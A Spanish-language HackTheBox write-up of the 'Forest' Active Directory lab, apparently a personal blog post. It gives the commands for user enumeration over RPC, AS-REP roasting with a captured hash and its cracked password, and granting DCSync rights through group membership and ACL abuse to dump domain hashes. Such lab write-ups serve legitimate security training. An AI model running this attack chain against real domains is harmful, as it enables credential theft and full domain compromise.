---
title: Forest - HackTheBox
categories: [ Windows ]
tags: [ HackTheBox ]
---

<img src="/assets/img/HTB/Forest/Forest.jpg">

¡Hola! El día de hoy completaremos la máquina [Forest](https://app.hackthebox.com/machines/Forest) de la plataforma [HackTheBox](https://app.hackthebox.com), donde tocaremos los siguientes puntos:

- **RPC Enumeration - Getting valid domain users**
- **Performing an AS-RepRoast attack with the obtained users**
- **Cracking hashes**
- **Abusing WinRM - Evil-WinRM**
- **BloodHound Enumeration**
- **Gathering system information with SharpHound.ps1 - PuckieStyle**
- **Representing and visualizing data in BloodHound**
- **Finding and attack vector in BloodHound**
- **Abusing Account Operators Group - Creating a New User**
- **Abusing Account Operators Group - Assigning a group to the newly created user**
- **Abusing WriteDacl in the domain - Granting DCSync Privileges**
- **DCSync Exploitation - Secretsdump.py**

# Enumeración 

## Escaneo de puertos

Como en toda máquina, comenzaremos con un escaneo de puertos con la herramienta `nmap`.

```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161
Nmap scan report for 10.10.10.161
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49703/tcp open  unknown          syn-ack ttl 127
49918/tcp open  unknown          syn-ack ttl 127
```

Ahora que tenemos los puertos abiertos, realizaremos un escaneo mucho más exhaustivo.

```sh
❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49918 -sCV 10.10.10.161 -oN targeted
Nmap scan report for htb.local (10.10.10.161)

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-18 18:10:42Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49918/tcp open  msrpc        Microsoft Windows RPC
```

## Enumeración SMB - TCP 445

En esta ocasión utilizaremos la herramienta `crackmapexec` para enumerar el servicio `SMB`, nos percatamos del dominio `htb.local`

```sh
❯ cme smb 10.10.10.161
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)

```

## Enumeración RPC - TCP 135

Para realizar la enumeración por RPC, usaremos la herramienta `rpcclient`, donde una vez adentro ejecutaremos el comando `enumdomusers`

```sh
❯ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[bourbon] rid:[0x2581]
user:[kid] rid:[0x2582]
user:[john] rid:[0x2583]
user:[lander] rid:[0x2585]
rpcclient $> 
```

Este comando nos reporta mucha cantidad de usuarios, los cuales los añadiremos a un archivo `users`.

# Explotación

## Ataque ASRepRoast

Ahora que tenemos una lista de usuarios válidos en el Directorio Activo, vamos a usar la herramienta `GetNPUsers.py` de la suite de `Impacket` para realizar un **ASRepRoast Attack**

```sh
❯ GetNPUsers.py htb.local/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:50eb84e1d1ca8ad19b91cc213c8c66f4$a289662f8cb72634ffb22cff5b77bae32d4637f84927c9f2ddb450ed5239aa706a522e707e00f4bf44be43710d994e53581c395b34ce9a9a5f520c8428433d1d444413bfbf6893e11788d39aa557365f92d07e25b7c045a0cee1a0a5ec7e05d9f90ad644c14fcb35d18dd966b667a334c1e00fb22b42dceffda6edfc4de56b4337d9acb6cf6eaa3e547205f6f395bf224d4607f7ce19e9b5e2f17082fdd0bc4b552dbaaf5247db0aaf2ef0512c39c4b2a50254453f0198d9fc97b79431616ea3528680e8262907bc7d7070a22023e56d618fdd93227a1a6bd61919b0e62e3dae2bf629817ca9
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bourbon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kid doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User john doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Conseguimos el hash de la contraseña del usuario `svc-alfresco`, la cual crackearemos usando la herramienta `john`

```sh
❯ john --show hash
$krb5asrep$23$svc-alfresco@HTB.LOCAL:s3rvice
```

Usaremos de nuevo la herramienta `crackmapexec` para ver si estas credenciales son válidas por el protocolo `SMB`

![](/assets/img/HTB/Forest/cme.png)

Ahora probaremos de nuevo con `crackmapexec` a ver si las credenciales son validas para conectarnos por `WinRM`

![](/assets/img/HTB/Forest/cme1.png)

Ahora que nos reporta las credenciales con el estado `(Pwn3d!)`, nos conectaremos al servicio WinRM con la herramienta `Evil-WinRM`

![](/assets/img/HTB/Forest/winrm.png)

# Escalada de privilegios

## BloodHound

Ahora que tenemos una consola en el sistema, vamos a recopilar información con el script `SharpHound.ps1`.

![](/assets/img/HTB/Forest/sharphound.png)

Ahora invocaremos el SharpHound para que nos cree los archivos necesarios para el BloodHound

![](/assets/img/HTB/Forest/zip.png)

Nos traeremos el comprimido a nuestro equipo, y lo importaremos a `BloodHound`, después, iremos a `Queries` y le daremos click a `Find Shorter Paths to Domain Admin`, y conseguimos el siguiente gráfico

![](/assets/img/HTB/Forest/bloodhound.png)

## Pasos
* * *
### Unirse al grupo "Exchange Windows Permissions"

Para unirse al grupo que nos reporta el Bloodhound, nos da el siguiente comando:

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
```

También podemos usar este:

```powershell
net group "Exchange Windows Permissions" svc-alfresco /add /domain
```

### Otorgarnos privilegios DCSync

Ya que tenemos acceso al grupo ese, podremos usar el siguiente comando que nos proporciona `BloodHound` para luego usar `secretsdump.py` y dumpear el `NTDS`

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```

## Explotación

Después de ejecutar los comandos, conseguimos dumpear el `NTDS`

![](/assets/img/HTB/Forest/secretsdump.png)

Ahora que tenemos el hash del usuario `Administrador`, podremos realizar un `Pass The Hash`

![](/assets/img/HTB/Forest/pwned.jpg.png)
